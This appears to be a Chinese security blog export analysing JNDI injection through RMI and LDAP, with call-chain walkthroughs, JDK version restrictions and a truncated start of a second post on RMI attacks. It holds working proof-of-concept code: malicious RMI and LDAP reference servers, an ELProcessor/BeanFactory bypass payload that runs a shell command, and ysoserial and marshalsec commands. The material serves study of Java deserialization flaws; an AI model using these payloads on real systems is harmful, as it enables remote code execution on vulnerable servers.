<li>服务端接收到JNDI Reference后从恶意RMIServer/LDAPServer获取工厂类</li>
<li>恶意RMIServer返回的工厂类中带有static块的Java代码，造成RCE</li>
</ol>
<h1 id="JNDI配合RMI远程对象"><a href="#JNDI配合RMI远程对象" class="headerlink" title="JNDI配合RMI远程对象"></a>JNDI配合RMI远程对象</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者将一个恶意的RMI远程对象绑定在RMI Registry上，然后将编译后远程对象类放在WEB服务器上，这个codebase地址由远程服务器的<code>java.rmi.server.codebase</code>属性设置，供受害者RMI客户端远程加载，RMI在lookup时，会先尝试在本地CLASSPATH中获取对应的Stub类定义，并从本地加载，若本地没有，则会向远程codebase指定地址去获取恶意对象。</p>
<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>此方式需要满足两个条件:</p>
<ol>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code>。  </li>
</ol>
<p>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由flase改成了true，在这样的情况下，Java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取。</p>
<blockquote>
<p>JNDI Naming Reference。JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类。</p>
</blockquote>
<h1 id="JNDI-Reference配合RMI"><a href="#JNDI-Reference配合RMI" class="headerlink" title="JNDI Reference配合RMI"></a>JNDI Reference配合RMI</h1><p>代码:</p>
<ul>
<li><p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ExecTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击者在RMI服务绑定一个JNDI Naming Reference，受害者接收到此Reference类后在解析时，会根据指定的codebase远程地址加载Factory类，原理上并非使用RMI Class Loading机制，不受第一种方式的限制。</p>
<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>从客户端lookup开始进行分析。进入客户端的lookup函数。</p>
</li>
</ul>
<p><img src="1.png" alt=""></p>
<p>先跟进getURLOrDefaultInitCtx(name)，然后再跟进lookup(name)。</p>
<p><img src="2.png" alt=""></p>
<p>通过url获取到scheme，即rmi，在该函数里初始化了rmiURLContext。然后跟进lookup(name)。</p>
<p><img src="3.png" alt=""></p>
<p>在这里进入到了GenericURLContext#lookup。然后继续跟进lookup。</p>
<p><img src="4.png" alt=""></p>
<p>这里调用了RegistryImpl_Stub#lookup函数。此lookup函数的作用在前面介绍RMI安全的已经介绍过了。即发送字符串到注册中心(即服务端)。服务端会根据字符串查找对应的ReferenceWrapper对象，然后返回给客户端。继续跟进decodeObject()函数。</p>
<p><img src="5.png" alt=""></p>
<p>如果是Reference对象，就会进入getReference()，获得绑定的Reference类。然后进入NamingManager.getObjectInstance()函数。</p>
<p><img src="6.png" alt=""></p>
<p>然后跟进getObjectFactoryFromReference()函数。</p>
<p><img src="7.png" alt=""></p>
<p>在该函数中，通过factoryName:ExecTest和codebase:<a href="http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。" target="_blank" rel="noopener">http://127.0.0.1:8081/加载了class，然后在末尾执行newInstance进行实例化，从而RCE。</a></p>
<h2 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h2><p>在JDK6u132、JDK7u122以及JDK8u113版本后，系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase默认值变为false，即不允许从远程的Codebase加载Reference工厂类。</p>
<p><img src="8.png" alt=""></p>
<p>并且在decodeObject()函数中增加了对trustURLCodebase的判断。</p>
<blockquote>
<p>在JDK8u111中，即使将trustURLCodebase默认值变为false，由于在decodeObject中并没有对于trustURLCodebase的判断，依然能够成功。</p>
</blockquote>
<h1 id="JNDI-Reference配合LDAP"><a href="#JNDI-Reference配合LDAP" class="headerlink" title="JNDI Reference配合LDAP"></a>JNDI Reference配合LDAP</h1><ul>
<li><p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ldap_server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8081/#ExecTest"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>除了RMI服务外，JNDI也可以对接LDAP服务，LDAP也能返回JNDI Reference对象。整个过程与上个方法类似，并且不受<code>com.sun.jndi.rmi.object.trustCodebase</code>等限制，适用范围更广。</p>
<h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>在Oracle JDK11.0.1、8u191、7u201、6u211之后，将com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>前面的流程与RMI一样，最终进入了PartialCompositeContext#lookup。</p>
<p><img src="11.png" alt=""></p>
<p>然后进入了ComponentContext#p_lookup。</p>
<p><img src="12.png" alt=""></p>
<p>继续跟进LdapCtx#c_lookup。</p>
<p><img src="13.png" alt=""></p>
<p>在该函数中，最终进入DirectoryManager#getObjectInstance(),后面的过程与RMI的后面一样，最终实例化。</p>
<h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>在JDK8u191之后，在使用codebase从远程loadClass时，会进行判断。</p>
<p><img src="14.png" alt=""></p>
<p>且com.sun.jndi.ldap.object.trustURLCodebase被设置为了false。</p>
<p><img src="15.png" alt=""></p>
<h1 id="绕过高版本JDK的限制"><a href="#绕过高版本JDK的限制" class="headerlink" title="绕过高版本JDK的限制"></a>绕过高版本JDK的限制</h1><p>根据以上介绍的限制，在Oracle JDK11.0.1、8u191、7u201、6u211及更高版本的JDK来说，前面提到的方式都失效了。对于存在以上漏洞但JDK版本很高的环境中，有人提到了如下2中方式进行bypass。<br>两种方式都很依赖受害者本地CLASSPATH中环境。  </p>
<h2 id="利用本地CLASSPATH中的恶意Reference-Factory类"><a href="#利用本地CLASSPATH中的恶意Reference-Factory类" class="headerlink" title="利用本地CLASSPATH中的恶意Reference Factory类"></a>利用本地CLASSPATH中的恶意Reference Factory类</h2><p>前面分析的整个过程首先是远程加载factory，然后进行实例化。但是在高版本的限制中，无法进行远程加载的时候，利用本地存在的Reference恶意类。实际上，本地不可能存在一个实例化就执行恶意代码的类。因此，看看加载完factory并实例化之后的事情。定位到NamingManager#getObjectInstance。</p>
<p><img src="16.png" alt=""></p>
<p>在前面分析到NamingManager#getObjectFactoryFromReference时，首先会进行本地factory的加载。 </p>
<p><img src="10.png" alt=""></p>
<p>在通过getObjectFactoryFromReference中获取到Factory类之后，对调用其getObjectInstance函数，其中参数ref和name是可控的。</p>
<p>因此，在高版本如JDK8u191以上的版本上，可以在返回的Reference中指定Factory类。这个类必须在受害者目标本地的CLASSPATH中。其中该类需要满足以下条件:</p>
<ol>
<li>实现<code>javax.naming.spi.ObjectFactory</code>接口</li>
<li>至少存在一个getObjectInstance()方法</li>
</ol>
<h3 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h3><p>org.apache.naming.factory.BeanFactory满足以上两个条件。它存在于Tomcat依赖包中，使用非常广泛，来看看如何利用它。首先定位到BeanFactory#getObjectInstance()函数。</p>
<p><img src="9.png" alt=""></p>
<p>可以看到在该函数中，如果传入的obj时一个ResourceRef实例，根据Reference对象的类名加载相应的类，并通过反射的方式实例化Reference所指向的任意Bean Class。</p>
<p><img src="17.png" alt=""></p>
<p>并且调用满足条件的方法，其中大概率是调用setter方法为所有属性赋值。看看满足条件的方法。</p>
<p><img src="19.png" alt=""></p>
<p>首先Reference类获取”forceString”的值，若值中存在等号(61)，则等号右边作为属性值对应的方法，左边为该方法的参数。若不含有=号，则获取该属性值的setter方法。相当于”forceString”可以为特定的属性指定setter方法一样。然后将方法和参数放入forced中，以供后续调用。</p>
<p>在这样的情况下，目标Bean Class必须: 1)有一个无参构造方法；2)存在能被调用的方法。</p>
<h3 id="ELProcessor类"><a href="#ELProcessor类" class="headerlink" title="ELProcessor类"></a>ELProcessor类</h3><p>在一篇文章中提到了利用javax.el.ELProcessor类。</p>
<p><img src="18.png" alt=""></p>
<p>其中eval函数仅接受一个String参数，执行传入的EL表达式。因此，只需要传入恶意的EL表达式即可达到RCE。现在需要解决的问题是将eval()函数设置为Reference类某属性的setter方法。让其自动调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceRef ref &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;eval&quot;));</span><br></pre></td></tr></table></figure>

<p>根据前面的分析，x为eval()方法的参数，传入恶意的表达式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ref.add(new StringRefAddr(&quot;x&quot;, &quot;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-c&#39;,&#39;open &#x2F;Applications&#x2F;Calculator.app&#39;]).start()&quot;)&quot;));</span><br></pre></td></tr></table></figure>

<h3 id="完整的payload"><a href="#完整的payload" class="headerlink" title="完整的payload"></a>完整的payload</h3><p>以RMI服务器为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">""</span><span class="string">".getClass().forName("</span>javax.script.ScriptEngineManager<span class="string">").newInstance().getEngineByName("</span>JavaScript<span class="string">").eval("</span><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">'(java.lang.String[])'</span>]([<span class="string">'/bin/sh'</span>,<span class="string">'-c'</span>,<span class="string">'open /Applications/Calculator.app'</span>]).start()<span class="string">")"</span>));</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"calc"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>

<p>运行之后，客户端运行代码即可弹出计算器。</p>
<blockquote>
<p>在运行过程，可能需要多运行几次才能成功。在本地测试时，时而失败，时而成功。可能与EL表达式有关。</p>
</blockquote>
<h2 id="利用LDAP返回恶意的序列化对象"><a href="#利用LDAP返回恶意的序列化对象" class="headerlink" title="利用LDAP返回恶意的序列化对象"></a>利用LDAP返回恶意的序列化对象</h2><p>JNDI与LDAP之间交互，其中Java对象在LDAP目录有多种存储形式:  </p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location(已弃用)</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性:</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
</ul>
<p>第二种方法中利用的是LDAP服务器支持直接返回一个Java对象的序列化数据。若Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()会对此字段值的内容进行反序列化。定位到obj.decodeObject()。</p>
<p><img src="20.png" alt="">  </p>
<p><img src="21.png" alt=""></p>
<p>当javaSerializedData属性存在时，首先会获取到一个classloader。然后进入obj.deserializeObject()方法。</p>
<p><img src="22.png" alt=""></p>
<p>在这里面最终会进入到readObject()方法。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设目标系统中存在着有漏洞的CommonsCollections库，那么首先可以利用ysoserial生成一个利用链，这里选择了commonscollections:3.2.1以及CommonsCollections6。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &#39;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&#39;|base64</span><br></pre></td></tr></table></figure>

<p><img src="23.png" alt=""></p>
<p>最终的LDAP服务器与前面比较，在sendResult时，对发送的Entry添加javaSerializedData属性，属性值为序列化的payload。</p>
<p><img src="24.png" alt=""></p>
<p>在复现时，为了避免codebase的影响，将其他属性注释掉了。最终在客户端lookup时弹出了计算器。</p>
<h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>在实际遇到这样的漏洞时，直接利用工具会比较方便。</p>
<h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><p>marshalsec可以很方便地启动一个LDAP/RMI Server</p>
<h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1099</span><br></pre></td></tr></table></figure>

<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1389</span><br></pre></td></tr></table></figure>


<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP(二)</a></li>
<li><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入整体的调用栈分析</a></li>
<li><a href="https://www.anquanke.com/post/id/199481#h3-7" target="_blank" rel="noopener">JNDI with RMI</a></li>
<li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java RMI攻击方式分析总结</title>
    <url>/2020/05/29/rmi-security/</url>
    <content><![CDATA[<p>RMI是一个基于序列化的Java远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。与RMI相关的攻击方式主要是:</p>
<ul>
<li>直接攻击RMI</li>
<li>JNDI注入</li>
</ul>
<p>这篇文章主要总结RMI自身的安全问题，分析注册中心、客户端与服务端之间的交互通信流程并总结攻击RMI注册中心，RMI服务端以及RMI客户端的方式。</p>
<a id="more"></a>
<h1 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h1><p>RMI依赖的通信协议为JRMP，该协议为Java定制，要求服务端与客户端均为Java编写。反序列化漏洞主要与JRMP有关，在通信过程中时通过序列化方式进行编码传输的。无论在JRMP的客户端还是服务端，当接收到JRMP协议数据时，都会将序列化的数据进行反序列化，因此造成了RMI注册中心、RMI服务端、RMI客户端都易受攻击的局面。</p>
<p>RMI分为三个主体部分:</p>
<ul>
<li>Client-客户端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">HelloInterface hello &#x3D; (HelloInterface) registry.lookup(&quot;hello1&quot;);</span><br><span class="line">System.out.println(hello.sayHello(&quot;flag&quot;));</span><br></pre></td></tr></table></figure>

<ul>
<li>Server-服务端</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HelloImpl remote  &#x3D; new HelloImpl();</span><br><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello1&quot;, remote);</span><br></pre></td></tr></table></figure>

<ul>
<li>Registry-注册中心</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(1099);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一般注册中心和服务端都是在一块，因为注册中心仅允许来自本地的bind/rebind/unbind请求。在这里我们把它们作为独立的个体描述。</p>
</blockquote>
<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2><p>任何可以被远程调用的方法的对象就是远程对象，它一般在服务端。用于提供客户端进行方法调用。它必须实现<code>java.rmi.Remote</code>接口，且需要继承UnicastRemoteObject类。(<font color=#824032>继承UnicastRemoteObject类是为了方便自动调用其exportObject()方法来生成本地Stub的代理对象，然后调用LiveRef.exportObject()方法来启动socket服务</font>)。  </p>
<p>注册中心也是一个远程对象，默认监听在1099端口上，与普通远程不一样的是，它需要自己指定端口。</p>
<h1 id="注册中心与服务端"><a href="#注册中心与服务端" class="headerlink" title="注册中心与服务端"></a>注册中心与服务端</h1><p>服务端与注册中心之间的交互主要是服务端向注册中心绑定服务，即bind/rebind操作。关注bind代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Registry registry &#x3D; LocateRegistry.getRegistry(1099);</span><br><span class="line">registry.bind(&quot;hello&quot;,obj);</span><br></pre></td></tr></table></figure>

<p><font color=#4682B4>[服务端]</font>首先getRegistry(1099)获取到了注册中心存根RegistryImpl_Stub(即注册中心RegistryImpl的代理)，然后调用其bind函数。定位到此函数.</p>
<p><img src="9.png" alt=""></p>
<p>先newCall建立连接，然后将object序列化发送至注册中心。注意这里的opnum参数，它代表了当前的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 : bind</span><br><span class="line">1 : list</span><br><span class="line">2 : lookup</span><br><span class="line">3 : rebind</span><br><span class="line">4 : unbind</span><br></pre></td></tr></table></figure>

<p><font color=#43CD80>[注册中心]</font>此时注册中心，接收数据的为<code>RegistryImpl_Skel#dispatch</code>。需要明白的是，RMI就是通过Stub和Skeleton在客户端和服务端传输数据。这里的var3即前面发送的opnum参数为0，即bind操作，这里直接定位到case 0:的部分。case 0中的0代表的是bind操作。</p>
<p><img src="12.png" alt=""></p>
<p>在这里完成了反序列化操作后，进入<code>sun.rmi.registry.RegistryImpl#bind</code>函数。</p>
<p><img src="13.png" alt=""></p>
<p>在这里可以看到，它在put函数之前，做了对于是否是本地的绑定的判断<code>checkAccess(&quot;Registry.bind&quot;)</code>。仅允许来自本地的bind操作。同理，可以看到，rebind/unbind操作都只能在本地完成。</p>
<p>在完成这个bind操作之后，就进入getResultStream()函数，跟进它。</p>
<p><img src="14.png" alt=""></p>
<p>它会向当前连接中发送81这个传输返回码，然后发送1这个值以及ID。到这里注册中心的部分完成了，继续往回看服务端的处理。关于81以及1这个数字的含义如下。发送81代表是返回，而紧随的数字1，表示是正常返回。</p>
<p><img src="17.png" alt=""></p>
<p><font color=#4682B4>[服务端]</font>服务端在发送完bind的数据后，接着执行super.ref.invoke()方法，其实也就是UnicastRef.invoke()方法，在这里面继续执行var1.executeCall()函数。跟进该函数。</p>
<p><img src="10.png" alt=""></p>
